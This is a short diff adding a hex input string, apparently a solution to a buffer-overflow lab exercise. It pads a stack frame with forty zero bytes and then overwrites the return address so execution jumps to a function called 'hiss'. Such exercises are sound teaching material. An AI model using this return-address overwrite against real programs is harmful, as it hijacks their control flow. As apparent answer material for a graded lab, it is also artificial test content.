@@ -1,0 +1,4 @@
+/* dummy zeroes to fill the stack frame */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+/* address of hiss function */
+68 16 40 00
